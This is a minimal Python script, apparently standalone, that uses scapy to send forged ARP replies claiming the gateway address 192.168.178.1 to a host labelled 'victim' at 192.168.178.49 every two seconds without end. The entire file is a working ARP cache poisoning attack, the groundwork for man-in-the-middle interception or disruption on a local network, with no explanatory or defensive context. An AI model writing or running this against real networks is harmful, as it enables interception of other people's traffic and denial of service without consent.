#!/usr/bin/python

from scapy.all import *
import time

op=1
victim="192.168.178.49"
spoof = "192.168.178.1"
mac = "e8:de:27:20:62:a3"

arp = ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)

while 1:

	send(arp)
	time.sleep(2)
